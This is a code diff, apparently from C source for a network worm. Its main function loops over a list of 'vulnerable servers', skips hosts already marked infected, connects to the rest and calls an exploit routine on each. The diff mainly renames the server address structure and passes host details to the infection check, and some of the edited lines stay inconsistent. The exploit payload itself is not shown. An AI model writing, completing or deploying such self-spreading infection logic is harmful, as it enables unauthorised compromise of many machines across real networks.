@@ -189,9 +189,9 @@ int main(int argc, char * argv[]) {
 	int my_sockfd;
 	struct sockaddr_in my_server_addr;
 	my_sockfd = socket(AF_INET, SOCK_STREAM, 0);
-	memset(&server_addr, 0, sizeof(server_addr));	
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(SERVER_PORT);
+	memset(&server_addr, 0, sizeof(my_server_addr));	
+    my_server_addr.sin_family = AF_INET;
+    my_server_addr.sin_port = htons(SERVER_PORT);
 
 
 	// Loops through the vulnerable servers 
@@ -199,14 +199,14 @@ int main(int argc, char * argv[]) {
 	current = my_list->Debut;
 	while(current!= NULL){
 		// Checks whether it has previously been infected 
-		if (is_infected()){
+		if (is_infected(current->IP,sockfd,&my_server_addr)){
 			continue;
 		}
 		else{
 			// Setting up a client connection
-			server_addr.sin_addr.s_addr = current->IP;
+			my_server_addr.sin_addr.s_addr = current->IP;
 			int connfd;
-			connfd = connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
+			connfd = connect(sockfd, (struct sockaddr*)&my_server_addr, sizeof(my_server_addr));
 			if (connfd >= 0){
 				// Launch exploit
 				exploit(connfd);
